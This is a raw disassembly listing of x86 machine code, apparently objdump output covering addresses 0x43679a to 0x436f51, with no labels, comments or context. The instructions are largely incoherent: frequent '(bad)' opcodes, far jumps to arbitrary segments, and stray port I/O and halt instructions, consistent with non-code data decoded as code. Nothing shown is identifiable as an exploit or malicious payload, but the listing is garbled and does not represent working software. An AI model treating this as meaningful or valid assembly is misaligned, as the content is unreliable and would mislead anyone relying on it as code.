  43679a:	jmp    FWORD PTR [ecx+0x2d]
  43679d:	or     eax,0xeb1ab9ff
  4367a2:	(bad)  
  4367a3:	cmp    DWORD PTR [ebx],ebp
  4367a5:	dec    edi
  4367a6:	ror    DWORD PTR [eax],0xce
  4367a9:	sub    eax,0x50
  4367ae:	add    BYTE PTR [eax],al
  4367b0:	ret    0xf5e8
  4367b3:	adc    al,0xa7
  4367b5:	aaa    
  4367b6:	in     eax,0x84
  4367b8:	jns    0x436761
  4367ba:	xchg   edx,eax
  4367bb:	pop    esp
  4367bc:	cmp    BYTE PTR [eax+0x2b2c6a0e],dh
  4367c2:	dec    edi
  4367c3:	hlt    
  4367c4:	pop    ecx
  4367c5:	sub    DWORD PTR [edi-0x44],ecx
  4367c8:	nop
  4367c9:	mov    ecx,0x36413a7
  4367ce:	dec    edi
  4367cf:	add    BYTE PTR [ebx],cl
  4367d1:	or     eax,0x3bbca394
  4367d6:	test   al,0xf9
  4367d8:	nop
  4367d9:	mov    BYTE PTR [ebx-0x14b5ecf4],ch
  4367df:	dec    edi
  4367e0:	or     eax,0xd7f9fb87
  4367e5:	sbb    al,0xb7
  4367e7:	ss jge 0x43680e
  4367ea:	test   al,0x66
  4367ec:	je     0x43684c
  4367ee:	dec    esi
  4367ef:	mov    esp,0x34968660
  4367f4:	mov    dh,0x7c
  4367f6:	test   al,0xe8
  4367f8:	in     al,dx
  4367f9:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4367fb:	stc    
  4367fc:	adc    BYTE PTR [edi],cl
  4367fe:	arpl   WORD PTR [eax],ax
  436800:	(bad)  
  436801:	(bad)  
  436802:	std    
  436803:	(bad)  
  436804:	xchg   edi,eax
  436805:	or     DWORD PTR [edi+0x18094e7b],ecx
  43680b:	adc    DWORD PTR [edx+ecx*1+0xaea000f],0x39
  436816:	add    BYTE PTR [eax],al
  436818:	add    BYTE PTR ds:0x1b50db56,al
  43681e:	shl    DWORD PTR [edi-0x57347a58],cl
  436824:	mov    edx,DWORD PTR ds:0x57f9a511
  43682a:	cmp    DWORD PTR [esi-0x5f4e5bb6],edx
  436830:	sub    al,0x47
  436832:	lods   al,BYTE PTR ds:[esi]
  436833:	sbb    BYTE PTR [edx-0x1c68b33],dh
  436839:	fld    DWORD PTR [edx]
  43683b:	jge    0x436865
  43683d:	xchg   edx,eax
  43683e:	or     DWORD PTR [edi],ecx
  436840:	test   DWORD PTR [ecx-0x78],edx
  436843:	mov    bh,0x64
  436845:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436846:	mov    dl,0x5c
  436848:	in     eax,dx
  436849:	aad    0x85
  43684b:	pop    eax
  43684c:	in     eax,dx
  43684d:	dec    ebp
  43684e:	xchg   BYTE PTR [eax],dh
  436850:	in     eax,dx
  436851:	inc    ebp
  436852:	xchg   BYTE PTR [eax*4-0x1fd6a418],dh
  436859:	lods   al,BYTE PTR ds:[esi]
  43685a:	lock sti 
  43685c:	jg     0x43688d
  43685e:	mov    dl,0xf5
  436860:	add    ebp,DWORD PTR [ebp+0x277ecbf0]
  436866:	mov    dl,0xf5
  436868:	add    eax,DWORD PTR [edx+0x61]
  43686b:	pusha  
  43686c:	or     DWORD PTR ds:0x90037929,edx
  436872:	mov    dl,0x8d
  436874:	sbb    BYTE PTR [edx-0x5],al
  436877:	xchg   ebx,eax
  436878:	stos   DWORD PTR es:[edi],eax
  436879:	repz mov cl,0xf5
  43687c:	add    eax,DWORD PTR [eax]
  43687e:	add    BYTE PTR [eax],al
  436880:	add    BYTE PTR [eax],al
  436882:	adc    BYTE PTR [ebp+0x22],bh
  436885:	add    eax,0x4403599
  43688a:	nop
  43688b:	mov    dl,0xab
  43688d:	push   edx
  43688e:	or     eax,0x148b60ab
  436893:	mov    ah,0xf5
  436895:	add    edi,DWORD PTR [eax+0x28]
  436898:	les    edi,FWORD PTR [eax+0x47c0c79]
  43689e:	nop
  43689f:	mov    dl,0x60
  4368a1:	or     edx,eax
  4368a3:	sub    eax,0xfa67946e
  4368a8:	hlt    
  4368a9:	xchg   bl,dl
  4368ab:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4368ad:	stos   DWORD PTR es:[edi],eax
  4368ae:	or     eax,0x35b90c9b
  4368b3:	xchg   BYTE PTR [eax+0x1],dh
  4368b6:	lds    ecx,FWORD PTR [ebx]
  4368b8:	xchg   ecx,eax
  4368b9:	das    
  4368ba:	xchg   edi,eax
  4368bb:	int    0x1f
  4368bd:	das    
  4368be:	test   al,0x2a
  4368c0:	or     BYTE PTR [ebx],0x35
  4368c3:	scas   eax,DWORD PTR es:[edi]
  4368c4:	push   cs
  4368c5:	das    
  4368c6:	stos   BYTE PTR es:[di],al
  4368c8:	or     eax,0x97aa6eee
  4368cd:	jno    0x4368d2
  4368cf:	cli    
  4368d0:	jmp    0x48ff:0xc70a61e9
  4368d7:	cld    
  4368d8:	neg    BYTE PTR [edi]
  4368da:	pop    ss
  4368db:	ss sub al,dh
  4368de:	cmp    ah,bh
  4368e0:	cmp    eax,0x850ad972
  4368e5:	pusha  
  4368e6:	add    BYTE PTR [eax],al
  4368e8:	add    BYTE PTR [eax],al
  4368ea:	add    BYTE PTR [eax],ch
  4368ec:	cld    
  4368ed:	xchg   ecx,eax
  4368ee:	test   eax,0x7499b6af
  4368f3:	(bad)  
  4368f5:	jmp    0x896:0x7e93fb9e
  4368fc:	das    
  4368fd:	into   
  4368fe:	adc    eax,0xae132eb7
  436903:	jbe    0x43690f
  436905:	scas   al,BYTE PTR es:[edi]
  436906:	inc    edi
  436907:	push   ebx
  436908:	mov    dl,0x97
  43690a:	popa   
  43690b:	sbb    edi,edx
  43690d:	jmp    0x5670:0xe27616e9
  436914:	push   es
  436915:	xchg   edi,eax
  436916:	call   0x6d21ee35
  43691b:	push   ebx
  43691c:	jle    0x436939
  43691e:	dec    esi
  43691f:	add    edx,DWORD PTR [edi]
  436921:	or     eax,0x512d93e9
  436926:	push   ecx
  436927:	ret    
  436928:	or     al,BYTE PTR [ecx+ecx*8+0x28]
  43692c:	sti    
  43692d:	dec    edx
  43692e:	(bad)
  436932:	jmp    0x6b3d98fd
  436937:	das    
  436938:	cli    
  436939:	mov    WORD PTR ds:0xe9eaf637,es
  43693f:	push   ss
  436940:	data16 xor al,BYTE PTR [eax]
  436943:	and    eax,0x3007463
  436948:	mov    ch,0xf6
  43694a:	sbb    bh,BYTE PTR ds:0x8be53b
  436950:	add    BYTE PTR [eax],al
  436952:	add    BYTE PTR [eax],al
  436954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436955:	lods   eax,DWORD PTR ds:[esi]
  436956:	xchg   edi,eax
  436957:	dec    esp
  436958:	test   DWORD PTR [esi-0x691ec91b],esp
  43695e:	(bad)  
  43695f:	(bad)  
  436960:	fisubr WORD PTR [eax+ebx*1]
  436963:	test   DWORD PTR [eax],esi
  436965:	ret    0x8b10
  436968:	call   0xca425537
  43696d:	sub    ebx,DWORD PTR [eax+0x4]
  436970:	ins    BYTE PTR es:[edi],dx
  436971:	jb     0x4369a5
  436973:	or     BYTE PTR [ecx+0x46],bh
  436976:	ret    
  436977:	std    
  436978:	cs inc ecx
  43697a:	xchg   ecx,eax
  43697b:	into   
  43697c:	and    DWORD PTR [ebx+eax*2+0x5a2b1eff],edi
  436983:	and    al,0xb1
  436985:	dec    esp
  436986:	cmp    al,0x1c
  436988:	cmovno edi,DWORD PTR [ecx]
  43698b:	ror    BYTE PTR [edi-0x4a210d3],0xb1
  436992:	push   cs
  436993:	push   ebx
  436994:	xor    dl,bh
  436996:	mov    esp,DWORD PTR ds:[edx+0x5899166]
  43699d:	scas   al,BYTE PTR es:[edi]
  43699e:	push   cs
  43699f:	add    BYTE PTR [esi+0x4c],al
  4369a2:	dec    edx
  4369a3:	and    ch,BYTE PTR [ecx-0x4c]
  4369a6:	xchg   ecx,eax
  4369a7:	add    edi,DWORD PTR [edx+0x46]
  4369aa:	xchg   ecx,eax
  4369ab:	mov    eax,0xeadc5
  4369b0:	in     al,dx
  4369b1:	iret   
  4369b2:	sbb    dl,BYTE PTR [ebp-0x52]
  4369b5:	mov    eax,ds:0x12de
  4369ba:	add    BYTE PTR [eax],al
  4369bc:	add    BYTE PTR [ecx],ch
  4369be:	mov    ah,0x91
  4369c0:	(bad)  
  4369c2:	in     eax,0x61
  4369c4:	seto   BYTE PTR [ebx+ebp*1+0xee21304]
  4369cc:	je     0x43695f
  4369ce:	inc    edi
  4369cf:	nop
  4369d0:	rcl    BYTE PTR [edx+eax*2+0xbdf41e],0xfe
  4369d8:	out    0x82,eax
  4369da:	dec    ecx
  4369db:	movq   QWORD PTR [esi],mm2
  4369de:	dec    esp
  4369df:	adc    al,BYTE PTR [eax]
  4369e1:	nop
  4369e2:	pop    edi
  4369e3:	push   ss
  4369e4:	test   DWORD PTR [ebp+eiz*4-0x2],edx
  4369e8:	or     cl,0x5d
  4369eb:	cmp    eax,0x55e49185
  4369f0:	cbw    
  4369f2:	arpl   WORD PTR [edx],dx
  4369f4:	stc    
  4369f5:	popf   
  4369f6:	mov    cl,0x8f
  4369f8:	inc    esp
  4369f9:	nop
  4369fa:	dec    eax
  4369fb:	(bad)  
  4369fc:	ja     0x436980
  4369fe:	leave  
  4369ff:	adc    al,BYTE PTR [ebp-0x7ae512bc]
  436a05:	enter  0xa486,0x74
  436a09:	imul   esi,DWORD PTR [ebx-0x7d8078ee],0x44
  436a10:	add    al,0x1b
  436a12:	add    eax,0x56198542
  436a17:	adc    al,BYTE PTR [eax]
  436a19:	nop
  436a1a:	mov    al,ds:0x4c65f73a
  436a1f:	punpckhbw mm0,QWORD PTR [eax]
  436a22:	add    BYTE PTR [eax],al
  436a24:	add    BYTE PTR [eax],al
  436a26:	nop
  436a27:	or     DWORD PTR [edi],edx
  436a29:	add    BYTE PTR [eax+0x3c],bh
  436a2c:	in     eax,dx
  436a2d:	(bad)  
  436a2e:	jg     0x4369bd
  436a30:	iret   
  436a31:	jae    0x4369d6
  436a33:	test   ah,dl
  436a35:	call   0xf9e7bb96
  436a3a:	or     eax,0xb083bb7
  436a3f:	sets   dl
  436a42:	jmp    0xab57:0xa0b6f6b2
  436a49:	pop    eax
  436a4a:	(bad)  
  436a4c:	in     al,dx
  436a4d:	add    edx,DWORD PTR ds:0xb507d16e
  436a53:	push   es
  436a54:	loope  0x436aa8
  436a56:	ret    
  436a57:	pusha  
  436a58:	test   al,0xda
  436a5a:	shr    DWORD PTR [ebx],0xe
  436a5d:	mov    ah,BYTE PTR ds:0x782f352d
  436a63:	sub    DWORD PTR [ecx],edi
  436a65:	loopne 0x436a06
  436a67:	or     al,BYTE PTR [ebx+0x4ef70917]
  436a6d:	add    edx,DWORD PTR [edi]
  436a6f:	outs   dx,BYTE PTR ds:[esi]
  436a70:	adc    DWORD PTR [esi+ebp*2],ebx
  436a73:	stos   BYTE PTR es:[edi],al
  436a74:	bound  eax,QWORD PTR [eax-0x4c]
  436a77:	call   0x50f6:0x8c8ca905
  436a7e:	dec    ebp
  436a7f:	arpl   WORD PTR [eax],cx
  436a81:	mov    DWORD PTR [esi+ecx*8],esi
  436a84:	leave  
  436a85:	icebp  
  436a86:	(bad)  [edx]
  436a88:	mov    al,ds:0xac
  436a8d:	add    BYTE PTR [eax],al
  436a8f:	push   edi
  436a90:	jbe    0x436a16
  436a92:	mov    ch,0x15
  436a94:	add    dh,BYTE PTR [edx-0x52]
  436a97:	cmp    al,0x55
  436a99:	xchg   esp,eax
  436a9a:	xor    BYTE PTR [esi+eax*8+0x60],dh
  436a9e:	inc    edi
  436a9f:	nop
  436aa0:	pusha  
  436aa1:	lea    ecx,[ecx+edx*2-0x9]
  436aa5:	jnp    0x436a30
  436aa7:	cwde   
  436aa8:	sub    al,0x74
  436aaa:	ss int 0x32
  436aad:	leave  
  436aae:	fbstp  TBYTE PTR [ebx+0x14f7c9b2]
  436ab4:	pop    ebp
  436ab5:	lds    ecx,FWORD PTR [eax-0x1c9bf4b2]
  436abb:	push   0x6880d2f6
  436ac0:	popf   
  436ac1:	push   cs
  436ac2:	mov    ebx,0xd9502f77
  436ac7:	(bad)  
  436ac8:	repnz pusha 
  436aca:	in     eax,dx
  436acb:	sbb    bl,ch
  436acd:	imul   dl
  436acf:	push   cs
  436ad0:	imul   edi,DWORD PTR [edx],0xffffffb8
  436ad3:	push   ss
  436ad4:	mov    ch,0x56
  436ad6:	fimul  DWORD PTR [edx-0x38]
  436ad9:	ror    BYTE PTR [edi-0x5ae459d6],0x52
  436ae0:	xor    BYTE PTR [ecx-0x17],bl
  436ae3:	ret    
  436ae4:	das    
  436ae5:	xchg   ebp,eax
  436ae6:	pop    ecx
  436ae7:	xchg   ebx,eax
  436ae8:	mov    dl,0xe
  436aea:	cmp    bh,BYTE PTR [esi+edi*4]
  436aed:	add    ebx,esi
  436aef:	cmp    al,0x30
  436af1:	fadd   st(1),st
  436af3:	add    BYTE PTR [eax],al
  436af5:	add    BYTE PTR [eax],al
  436af7:	add    BYTE PTR [esi-0x1f],ch
  436afa:	jmp    0x436aca
  436afc:	or     ah,dh
  436afe:	dec    edx
  436aff:	daa    
  436b00:	inc    edi
  436b01:	pop    edi
  436b02:	(bad)  
  436b03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436b04:	(bad)  
  436b05:	xor    al,0xfe
  436b07:	call   0x1a4d721c
  436b0c:	inc    edi
  436b0d:	pusha  
  436b0e:	xchg   edi,eax
  436b0f:	sbb    eax,0x1343c9b0
  436b14:	mov    al,ds:0x63e15429
  436b19:	sub    DWORD PTR [edx-0x3b],edx
  436b1c:	fwait
  436b1d:	bound  edx,QWORD PTR [edi+0x4aa1e490]
  436b23:	xlat   BYTE PTR ds:[ebx]
  436b24:	push   ebx
  436b25:	mov    dl,0x45
  436b27:	adc    BYTE PTR [edx-0xb],ch
  436b2a:	je     0x436b0d
  436b2c:	cmp    DWORD PTR [ecx],ebp
  436b2e:	pop    edx
  436b2f:	or     eax,0xfc670d78
  436b34:	cmp    al,0xfb
  436b36:	ja     0x436b20
  436b38:	test   eax,0x57a59996
  436b3d:	popf   
  436b3e:	add    BYTE PTR ds:[edx+0x3e],ch
  436b42:	cmp    eax,0x91b3eb57
  436b47:	into   
  436b48:	rcr    DWORD PTR [edi],1
  436b4a:	popa   
  436b4b:	jmp    DWORD PTR [esi-0x2d7a39d6]
  436b51:	lds    esi,FWORD PTR [esi-0x1]
  436b54:	sbb    eax,0xf48b26d5
  436b59:	mov    al,0x59
  436b5b:	call   0x436b60
  436b60:	add    BYTE PTR [edi+esi*4+0x41a2ffe5],bh
  436b67:	imul   edi,esi,0x8b51bd38
  436b6d:	repnz rcl BYTE PTR [ecx-0x1f8bc68f],0x75
  436b75:	std    
  436b76:	jae    0x436b55
  436b78:	jmp    0x436b74
  436b7a:	sub    edx,eax
  436b7c:	sub    al,0xd1
  436b7e:	xlat   BYTE PTR ds:[ebx]
  436b7f:	sub    eax,0x9db0c6ff
  436b84:	sar    BYTE PTR [eax+edi*1+0x62],0x2b
  436b89:	inc    ebx
  436b8a:	adc    edi,DWORD PTR [edx]
  436b8c:	rol    BYTE PTR [eax-0x47a04c7],cl
  436b92:	mov    edx,0x166e0f2e
  436b97:	(bad)  
  436b98:	in     eax,dx
  436b99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436b9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436b9b:	xchg   ecx,eax
  436b9c:	(bad)  
  436b9d:	xor    dh,BYTE PTR [edx+0x32]
  436ba0:	cmp    BYTE PTR [edx-0xfcc912],dl
  436ba6:	pop    ebp
  436ba7:	idiv   BYTE PTR [ebx+0x47e5413e]
  436bad:	mov    dh,0x77
  436baf:	int    0x3b
  436bb1:	in     al,dx
  436bb2:	shl    ebx,0x33
  436bb5:	out    dx,eax
  436bb6:	push   0x45e1cb91
  436bbb:	ret    0x90fe
  436bbe:	pop    esp
  436bbf:	imul   eax,edx,0xffffffd7
  436bc2:	inc    ebx
  436bc3:	ds push ebp
  436bc5:	add    BYTE PTR [eax],al
  436bc7:	add    BYTE PTR [eax],al
  436bc9:	add    BYTE PTR [ebx],dl
  436bcb:	(bad)  
  436bcc:	(bad)  
  436bcd:	mov    ebp,0x51460980
  436bd2:	or     edi,DWORD PTR [esi]
  436bd4:	repz ud2 
  436bd7:	jae    0x436be8
  436bd9:	mov    cl,0x9f
  436bdb:	mov    eax,ds:0x95478281
  436be0:	push   0x44
  436be2:	je     0x436bdd
  436be4:	xchg   edx,eax
  436be5:	sar    BYTE PTR [ebp+0x39bfe40c],0x85
  436bec:	adc    al,BYTE PTR [eax]
  436bee:	nop
  436bef:	sbb    eax,DWORD PTR [edi]
  436bf1:	xor    BYTE PTR [ebx+0x1e2d0f09],dl
  436bf7:	sbb    al,0xa0
  436bf9:	xor    edi,DWORD PTR [eax+0x7005388]
  436bff:	push   DWORD PTR [esi]
  436c01:	push   cs
  436c02:	push   eax
  436c03:	or     DWORD PTR [esi+0x8d47cc0],edx
  436c09:	(bad)  
  436c0a:	out    dx,al
  436c0b:	mov    ch,0xf6
  436c0d:	pop    ss
  436c0e:	sbb    eax,DWORD PTR [edx-0x79]
  436c11:	jne    0x436c8c
  436c13:	cmp    esp,DWORD PTR [eax-0x5a711f7b]
  436c19:	jae    0x436baf
  436c1b:	fmul   st,st(6)
  436c1d:	in     eax,0x5e
  436c1f:	adc    BYTE PTR [esi+0x0],0x63
  436c23:	nop
  436c24:	xchg   edi,eax
  436c25:	pushf  
  436c26:	xchg   ecx,eax
  436c27:	or     DWORD PTR [edi],ecx
  436c29:	dec    ebp
  436c2a:	cmp    BYTE PTR [ecx],bh
  436c2c:	add    BYTE PTR es:[eax],al
  436c2f:	add    BYTE PTR [eax],al
  436c31:	add    BYTE PTR [eax],al
  436c33:	nop
  436c34:	pushf  
  436c35:	imul   ecx,edx,0xffffffa8
  436c38:	or     DWORD PTR [eax-0x326f6807],ebx
  436c3e:	test   BYTE PTR [eax-0x4e],dl
  436c41:	leave  
  436c42:	fimul  WORD PTR [esi+ebp*2]
  436c45:	adc    DWORD PTR [eax],ebx
  436c47:	imul   BYTE PTR [edi+0x2f903844]
  436c4d:	xor    eax,0x670adffb
  436c52:	or     al,0x6a
  436c54:	xrelease xchg DWORD PTR [ebx],ebx
  436c57:	mov    al,ds:0xee03f57d
  436c5c:	(bad)  
  436c5d:	cmp    al,0x37
  436c5f:	je     0x436c2b
  436c61:	pusha  
  436c62:	sar    DWORD PTR [eax],0x7e
  436c65:	pop    edi
  436c66:	mov    dl,0x39
  436c68:	cs xor eax,0xb278438
  436c6e:	jle    0x436c02
  436c70:	mov    dh,dh
  436c72:	mov    dl,0x80
  436c74:	mov    edi,0x281e9e35
  436c79:	cmp    ecx,DWORD PTR [esi-0x46]
  436c7c:	push   ebx
  436c7d:	call   0xf47d:0x2ab29cc5
  436c84:	pusha  
  436c85:	pusha  
  436c86:	add    esp,DWORD PTR [edx+0x5b]
  436c89:	jo     0x436cf7
  436c8b:	adc    al,0xb1
  436c8d:	cmc    
  436c8e:	add    eax,DWORD PTR [ecx+0x61]
  436c91:	pusha  
  436c92:	aas    
  436c93:	cwde   
  436c94:	mov    cl,dh
  436c96:	jle    0x436c98
  436c98:	add    BYTE PTR [eax],al
  436c9a:	add    BYTE PTR [eax],al
  436c9c:	push   ebx
  436c9d:	test   BYTE PTR [esp+ebx*4],0x6b
  436ca1:	sub    DWORD PTR [ecx+esi*4-0xaf70dec],edi
  436ca8:	or     al,0x65
  436caa:	mov    DWORD PTR [edi-0x7d2e8229],eax
  436cb0:	mov    edi,0x9063f1b1
  436cb5:	jnp    0x436c90
  436cb7:	fwait
  436cb8:	inc    edx
  436cb9:	pop    esp
  436cba:	ins    BYTE PTR es:[edi],dx
  436cbb:	mov    cl,0x15
  436cbd:	add    cl,BYTE PTR [esi]
  436cbf:	ins    BYTE PTR es:[edi],dx
  436cc0:	fidivr DWORD PTR [ebp+0x5]
  436cc3:	push   ss
  436cc4:	jecxz  0x436cb1
  436cc6:	pusha  
  436cc7:	gs add eax,0x1bb7167e
  436ccd:	mov    dl,0x95
  436ccf:	push   esi
  436cd0:	inc    ecx
  436cd1:	aaa    
  436cd2:	into   
  436cd3:	aam    0x90
  436cd5:	aaa    
  436cd6:	fcom   QWORD PTR [ecx-0x2e]
  436cd9:	test   bl,ch
  436cdb:	data16 xor cl,BYTE PTR ds:[ebx-0x69]
  436ce0:	sbb    dh,BYTE PTR [ecx]
  436ce2:	push   ss
  436ce3:	jmp    0x725deab4
  436ce8:	iret   
  436ce9:	out    dx,al
  436cea:	xchg   esp,eax
  436ceb:	test   al,0x97
  436ced:	cmp    DWORD PTR ds:0xf6d79359,ebx
  436cf3:	bound  edx,QWORD PTR [ebx-0x7032a5c9]
  436cf9:	jmp    0x436c98
  436cfb:	pop    ebp
  436cfc:	xchg   ebx,eax
  436cfd:	mov    dl,0xe
  436cff:	add    BYTE PTR fs:[eax],al
  436d02:	add    BYTE PTR [eax],al
  436d04:	add    al,cl
  436d06:	xchg   esi,eax
  436d07:	sbb    al,BYTE PTR [ecx-0x16f19afd]
  436d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436d0e:	mov    dh,0x3e
  436d10:	shl    ebp,1
  436d12:	cmp    ebx,ebp
  436d14:	(bad)  
  436d15:	psllq  mm3,QWORD PTR [edx]
  436d18:	je     0x436ced
  436d1a:	xor    BYTE PTR [esi],dl
  436d1c:	jmp    0x7287f25d
  436d21:	retf   0xe49f
  436d24:	push   ds
  436d25:	push   ebp
  436d26:	call   0xb3d783d3
  436d2b:	mov    gs,WORD PTR [esp+edx*8+0x65]
  436d2f:	adc    ah,BYTE PTR [eax+eax*1+0x66]
  436d33:	push   ss
  436d34:	push   0x8eeaec00
  436d39:	pusha  
  436d3a:	adc    BYTE PTR fs:[eax],al
  436d3d:	and    ch,BYTE PTR [eax]
  436d3f:	(bad)  
  436d40:	not    BYTE PTR [ecx+0x2c515b74]
  436d46:	mov    DWORD PTR [edx],esi
  436d48:	and    ah,ch
  436d4a:	mov    cl,0x32
  436d4c:	sbb    al,0xe1
  436d4e:	push   0xffffffec
  436d50:	jmp    FWORD PTR [ecx+0x6e]
  436d53:	fiadd  WORD PTR [ebp-0x7adc6229]
  436d59:	fisubr WORD PTR [eax-0x26b2c6ff]
  436d5f:	add    dh,BYTE PTR [edi+eiz*2+0x6e]
  436d63:	push   edx
  436d64:	and    al,0x35
  436d66:	xor    eax,0x26
  436d6b:	add    BYTE PTR [eax],al
  436d6d:	add    BYTE PTR ds:0x397aa510,al
  436d73:	mov    edx,0xb2d2858e
  436d78:	push   edx
  436d79:	cmc    
  436d7a:	xchg   edx,eax
  436d7b:	aam    0xe5
  436d7d:	je     0x436dd4
  436d7f:	mov    ebp,0xc1554497
  436d84:	in     eax,0x74
  436d86:	push   ebp
  436d87:	mov    ebp,0x6df9d791
  436d8c:	shr    eax,1
  436d8e:	lods   eax,DWORD PTR ds:[esi]
  436d8f:	mov    bh,0xe
  436d91:	add    BYTE PTR [edx+0x7407f126],al
  436d97:	and    DWORD PTR [edx+0x3],esp
  436d9a:	daa    
  436d9b:	mov    ch,0xe
  436d9d:	pop    edi
  436d9e:	jb     0x436d98
  436da0:	inc    edi
  436da1:	pop    ebp
  436da2:	mov    dl,0xf4
  436da4:	add    DWORD PTR [eax],eax
  436da6:	jp     0x436d33
  436da8:	inc    eax
  436da9:	mov    eax,DWORD PTR [eax]
  436dab:	in     eax,0xaa
  436dad:	push   edi
  436dae:	xor    bl,BYTE PTR [ecx+edx*4]
  436db1:	lock sub al,0x89
  436db4:	push   cs
  436db5:	pop    es
  436db6:	sub    DWORD PTR [ebx],edi
  436db8:	shl    DWORD PTR [ebp-0x70],0xdf
  436dbc:	xchg   ebp,eax
  436dbd:	stc    
  436dbe:	and    eax,0xa7f991d3
  436dc3:	aaa    
  436dc4:	mov    ebx,0x67dd2679
  436dc9:	repz or eax,0xe1503a71
  436dcf:	retf   0x548d
  436dd2:	add    BYTE PTR [eax],al
  436dd4:	add    BYTE PTR [eax],al
  436dd6:	add    BYTE PTR [ecx+edi*4-0x124bb373],ch
  436ddd:	xchg   BYTE PTR [esi-0x6e],dl
  436de0:	(bad)  [esi]
  436de2:	test   DWORD PTR [eax+0x57],esp
  436de5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436de6:	js     0x436d93
  436de8:	pop    esi
  436de9:	mov    ebx,0x1eb27d73
  436dee:	and    al,0x78
  436df0:	sub    eax,0xb5d484f5
  436df5:	push   es
  436df6:	sub    eax,0x7fa4059
  436dfb:	les    eax,FWORD PTR [eax]
  436dfd:	jns    0x436e75
  436dff:	nop
  436e00:	loopne 0x436d90
  436e02:	or     DWORD PTR [ebx+0x11],0x53
  436e06:	repz cmp edi,ebp
  436e09:	mov    ebx,0x8dd17474
  436e0e:	inc    esp
  436e0f:	ins    BYTE PTR es:[edi],dx
  436e10:	add    eax,0x1b474bc
  436e15:	push   0xa86460d1
  436e1a:	call   0x524a42
  436e1f:	or     ecx,DWORD PTR [edx]
  436e21:	mov    BYTE PTR [edi],al
  436e23:	adc    eax,0xa3032301
  436e28:	sbb    DWORD PTR [ecx],esi
  436e2a:	xchg   DWORD PTR [ebx+0x36c267d0],edx
  436e30:	(bad)  
  436e31:	push   edi
  436e32:	mov    esi,0x5140d9a4
  436e37:	sbb    esi,DWORD PTR [ebx+0xf2ae]
  436e3d:	add    BYTE PTR [eax],al
  436e3f:	add    cl,al
  436e41:	sub    DWORD PTR [esp+eax*1],esp
  436e44:	xchg   ecx,eax
  436e45:	xor    bh,BYTE PTR [edx-0x52]
  436e48:	and    esi,DWORD PTR [esi-0x45dc2e8e]
  436e4e:	jbe    0x436df9
  436e50:	cdq    
  436e51:	out    dx,eax
  436e52:	imul   ebp,DWORD PTR [esi],0x22
  436e55:	mov    ah,0x70
  436e57:	mov    ah,0x13
  436e59:	call   0x6f488c3a
  436e5e:	sbb    DWORD PTR [eax+edx*4],ecx
  436e61:	sub    ch,BYTE PTR [ecx]
  436e63:	cmp    eax,0x48f4b2d0
  436e68:	aam    0x96
  436e6a:	(bad)  
  436e6c:	popa   
  436e6d:	xor    eax,0xaa8d3807
  436e72:	lds    esi,FWORD PTR [edi]
  436e74:	iret   
  436e75:	xor    eax,0x3b943824
  436e7a:	es call 0x3291:0x3af30dc
  436e82:	add    cl,ch
  436e84:	(bad)  
  436e85:	out    dx,eax
  436e86:	mov    bh,ah
  436e88:	(bad)  
  436e89:	cmp    eax,0x83c0ae9f
  436e8e:	mov    edx,?
  436e90:	and    edi,ebp
  436e92:	rol    DWORD PTR [edi-0x7d0a8d7e],0xd4
  436e99:	rcr    DWORD PTR [esi],0x29
  436e9c:	nop
  436e9d:	mov    bh,0x75
  436e9f:	xchg   eax,edx
  436ea1:	imul   ebx,edi,0xe8
  436ea7:	add    BYTE PTR [eax],al
  436ea9:	xor    al,0x67
  436eab:	sti    
  436eac:	aaa    
  436ead:	xchg   edx,eax
  436eae:	cmp    ebx,DWORD PTR [ebp-0x59c46d67]
  436eb4:	(bad)  
  436eb5:	xchg   esp,eax
  436eb6:	stos   DWORD PTR es:[edi],eax
  436eb7:	cmc    
  436eb8:	add    ch,bl
  436eba:	mov    cl,BYTE PTR [esi]
  436ebc:	ins    BYTE PTR es:[edi],dx
  436ebd:	push   es
  436ebe:	addr16 adc dh,dl
  436ec1:	add    ah,BYTE PTR [ebx-0x1]
  436ec4:	jno    0x436f0e
  436ec6:	xchg   esi,eax
  436ec7:	sbb    ah,BYTE PTR [esp+ecx*8+0x65]
  436ecb:	pop    ss
  436ecc:	pusha  
  436ecd:	mov    esp,0xc26412d5
  436ed2:	imul   edx,DWORD PTR gs:[ebp-0x318db44e]
  436eda:	mov    edx,eax
  436edc:	fst    QWORD PTR [ebx+0x5b62447f]
  436ee2:	mov    al,ds:0xddf8bed5
  436ee7:	stos   BYTE PTR es:[edi],al
  436ee8:	mov    dh,0x93
  436eea:	mov    bl,0x8e
  436eec:	ins    BYTE PTR es:[edi],dx
  436eed:	pop    ecx
  436eee:	bound  edx,QWORD PTR [edx]
  436ef0:	fs inc edx
  436ef2:	bound  edx,QWORD PTR [esi]
  436ef4:	push   0x3eeaec2a
  436ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436efa:	pusha  
  436efb:	adc    BYTE PTR [edx+0x5],ah
  436efe:	xor    ah,ah
  436f00:	mov    cl,0xa6
  436f02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436f03:	pop    edx
  436f04:	int    0x8f
  436f06:	sub    ch,dh
  436f08:	scas   eax,DWORD PTR es:[edi]
  436f09:	shl    DWORD PTR [edx+0xac1b],cl
  436f0f:	add    BYTE PTR [eax],al
  436f11:	add    bh,dl
  436f13:	xchg   esi,eax
  436f14:	or     ah,BYTE PTR [edx-0x1d]
  436f17:	xor    eax,eax
  436f19:	jl     0x436ea2
  436f1b:	push   eax
  436f1c:	and    eax,0x917a5ff1
  436f21:	adc    al,bh
  436f23:	mov    dh,0x97
  436f25:	imul   BYTE PTR [eax]
  436f27:	sub    BYTE PTR [ebx+eiz*2-0x2d714c6c],0xea
  436f2f:	jmp    0xce68:0x38f40d61
  436f36:	inc    ebx
  436f37:	cmp    DWORD PTR [edi],0x0
  436f3a:	(bad)  
  436f3b:	les    ecx,FWORD PTR [esi+0x69b6a916]
  436f41:	(bad)  
  436f42:	jmp    0xae43d39f
  436f47:	xor    DWORD PTR [edi+0x21e871c0],ecx
  436f4d:	(bad)  
  436f4e:	sahf   
  436f4f:	mov    ah,0x62
  436f51:	push   es
